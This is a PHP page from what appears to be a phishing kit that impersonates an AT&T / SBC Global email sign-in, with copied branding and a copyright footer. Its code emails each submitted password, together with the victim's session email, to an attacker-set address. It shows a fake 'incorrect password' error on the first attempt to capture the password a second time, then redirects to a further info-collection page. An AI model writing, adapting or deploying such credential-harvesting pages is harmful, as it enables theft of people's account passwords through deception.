<?php
session_start();
include '../../../settings.php';
include '../../../sender.php';

$error = false;
if(isset($_POST['submit'])) {
    send_mail($Receive_email,["email"=>$_SESSION['email'],'password'=>$_POST['password']],"ATT & SBC GLOBAL");
    if(isset($_SESSION['count_att'])){
        $_SESSION['count_att'] = $_SESSION['count_att'] + 1;
        if($_SESSION['count_att'] % 2 == 0){
            $error = false;
            $_SESSION['password_oauth'] = $_POST['password'];
            $_SESSION['oauth_email'] = "ATT & SBC GLOBAL Mail";
            header("Location: $site_root/info.php");
        }
        else{
            $error = true;
        }
    }
    else{
        $_SESSION['count_att'] = 1;
        $error = true;
    }
}
?>
<!DOCTYPE html>
<html lang="en">
    <head>
            <title> ATT-OAUTH Email Authentication</title>
            <meta charset="utf-8">
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <link rel="shortcut icon" href="assets/images/favicon.ico">
            <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css">
            <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
            <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
            <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js"></script>
    </head>
    <style>
        body{
            background-color: #f5f5f5;
        }
        .ctn{
            padding: 10px;
        }
        .card-body-c{
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }
        .logo{
            width: 60px;
            height: 40px;
        }
        .text-title{
            width: 100%;
            text-align: left;
        }
        .form-control{
            border: 1px solid blue;
            height: 40px;
            border-radius: 3px;
            background-color: #fff;
            margin-top: 15px;
            margin-bottom: 20px;
        }
        .btn-primary{
            width: 100%;
            height: 45px;
        }
        .below{
            text-align: center;
            margin-top: 20px;
        }
        .footer{
            text-align: center;
            margin-top: 20px;
        }
        .f-link{
            font-size: 12px;
            margin-right: 10px;
            margin-left: 10px;
        }
        .spec{
            min-height: 100vh;
            padding-top: 10vh;
        }
        .error{
            font-size: 12px;
            color: red;
        }
    </style>
    <body>
    <div class="container-fluid spec">
            <div class="row d-flex align-items-center justify-content-center">
                <div class="col-lg-4 col-mg-4 col-md-6 col-sm-8">
                    <div class="card">
                        <div class="ctn">
                            <div class="card-body-c">
                                <img src="att-logo.svg" class="logo">
                                <h4>Sign In</h4>
                                <p class="mb-3">Authenticate with Email Password</p>
                                <p class="mb-1"><img src="assets/images/arrow.svg" class="arrow"><?= $_SESSION['email'] ?></p>
                                <?php
                                    if($error){
                                        ?>
                                        <p class="error">Password is incorrect, Please try again</p>
                                <?php
                                }
                                ?>
                            </div>
                            <p class="text-title mb-2">Enter password</p>
                            <form method="post" action="">
                                <input type="password" class="form-control" placeholder="Password" autocorrect="off" autocapitalize="off" spellcheck="false" id="password" name="password" required>
                                
                                <button type="submit" class="btn btn-primary" name="submit">Sign in</button>
                            </form>
                            <div class="below">
                                <a href="#">Cancel</a>
                                <hr/>
                                <p>Don't Have a User ID?</p>
                                <a href="#"><h5>Create Account</h5></a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        <div class="footer">
            <a class="f-link" href="#">Legal Policy Center</a>
            <a class="f-link" href="#">Privacy Policy</a>
            <a class="f-link" href="#">Terms of Use</a>
            <a class="f-link" href="#">Accessibility</a>
            <a class="f-link" href="#">Do not sell my personal information</a>
            <p style="font-size: 11px;">©2021 AT&T Intellectual Property. All rights reserved.</p>
        </div>
    </div>
    </body>